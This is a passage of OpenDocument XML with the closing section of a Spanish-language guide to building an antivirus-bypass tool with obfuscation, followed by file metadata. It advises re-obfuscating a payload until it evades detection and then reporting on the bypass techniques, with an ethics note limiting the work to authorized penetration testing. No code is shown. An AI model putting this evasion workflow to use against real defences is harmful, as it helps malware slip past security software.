              <text:p text:style-name="P19">Si es detectado, ajusta el código (usando más ofuscación o técnicas adicionales) y vuelve a probar. </text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P1"/>
      <text:h text:style-name="Heading_20_4" text:outline-level="4"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">7. Creación de Reportes y Mejoras</text:span></text:span></text:h>
      <text:list xml:id="list1718555029" text:style-name="L59">
        <text:list-item>
          <text:p text:style-name="P68"><text:span text:style-name="T2">Después de realizar las pruebas de bypass, es recomendable crear un </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">informe detallado</text:span></text:span><text:span text:style-name="T2"> sobre las técnicas utilizadas, los resultados obtenidos y las mejoras posibles para futuras versiones del payload. </text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P1"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Consideraciones Éticas y Legales:</text:span></text:span></text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T2">Este tipo de proyecto debe realizarse </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">únicamente con fines educativos</text:span></text:span><text:span text:style-name="T2"> y en entornos controlados y éticos, como laboratorios de pruebas o sistemas propios que no sean afectados por los ataques. Es importante recordar que las técnicas de bypass de antivirus deben usarse solo en el contexto de </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">pruebas de penetración</text:span></text:span><text:span text:style-name="T2"> autorizadas y no con fines maliciosos.</text:span></text:p>
      <text:p text:style-name="P1"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Conclusión:</text:span></text:span></text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T2">Crear una </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">herramienta de bypass de antivirus con técnicas de ofuscación</text:span></text:span><text:span text:style-name="T2"> es un proyecto avanzado que implica una comprensión profunda de los antivirus, los sistemas de detección, las técnicas de ofuscación y el análisis de binarios. Este proyecto no solo mejorará tus habilidades en la programación y el hacking ético, sino también en el diseño y la evasión de mecanismos de seguridad utilizados por los antivirus.</text:span></text:p>
      <text:p text:style-name="P4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2:28:04.746000000</meta:creation-date>
    <dc:date>2025-01-06T02:56:19.335000000</dc:date>
    <meta:editing-duration>PT23M12S</meta:editing-duration>
    <meta:editing-cycles>8</meta:editing-cycles>
    <meta:generator>Trio_Office/6.2.8.2$Windows_x86 LibreOffice_project/</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="4" meta:paragraph-count="60" meta:word-count="987" meta:character-count="6379" meta:non-whitespace-character-count="5489"/>
  </office:meta>
</office:document-meta>
</file>